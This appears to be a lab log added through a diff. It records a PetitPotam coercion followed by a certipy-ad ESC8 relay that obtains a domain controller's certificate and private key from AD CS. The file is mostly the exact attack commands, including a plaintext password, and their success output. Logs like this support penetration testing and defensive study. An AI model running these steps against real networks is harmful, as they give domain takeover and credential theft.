@@ -1,0 +1,61 @@
+
+┌──(bang㉿kali)-[~/PetitPotam]
+└─$ python3 PetitPotam.py 192.168.0.30 192.168.0.100 -u "test" -p "Qpr1al9te!"
+/home/bang/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
+  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
+
+                                                                                               
+              ___            _        _      _        ___            _                     
+             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
+             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
+            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
+          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
+          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+                                         
+              PoC to elicit machine account authentication via some MS-EFSRPC functions
+                                      by topotam (@topotam77)
+      
+                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
+
+
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:192.168.0.100[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+
+
+
+──(bang㉿kali)-[~/esc]
+└─$ certipy-ad relay -target http://192.168.0.10/certsrv/certrqxt.asp  -template DomainController
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Targeting http://192.168.0.10/certsrv/certrqxt.asp/certsrv/certfnsh.asp (ESC8)
+[*] Listening on 0.0.0.0:445
+[*] Setting up SMB Server
+[*] SMBD-Thread-2 (process_request_thread): Received connection from 192.168.0.100, attacking target http://192.168.0.10
+[*] HTTP Request: GET http://192.168.0.10/certsrv/certrqxt.asp/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
+[*] HTTP Request: GET http://192.168.0.10/certsrv/certrqxt.asp/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
+[*] HTTP Request: GET http://192.168.0.10/certsrv/certrqxt.asp/certsrv/certfnsh.asp "HTTP/1.1 404  "
+[*] Authenticating against http://192.168.0.10 as WORK/DC02$ SUCCEED
+[*] Requesting certificate for 'WORK\\DC02$' based on the template 'DomainController'
+[*] SMBD-Thread-4 (process_request_thread): Connection from 192.168.0.100 controlled, but there are no more targets left!
+[*] HTTP Request: POST http://192.168.0.10/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
+[*] Certificate issued with request ID 25
+[*] Retrieving certificate for request ID: 25
+[*] HTTP Request: GET http://192.168.0.10/certsrv/certnew.cer?ReqID=25 "HTTP/1.1 200 OK"
+[*] Got certificate with DNS Host Name 'dc02.work.local'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'dc02.pfx'
+[*] Wrote certificate and private key to 'dc02.pfx'
+[*] Exiting...
+
+
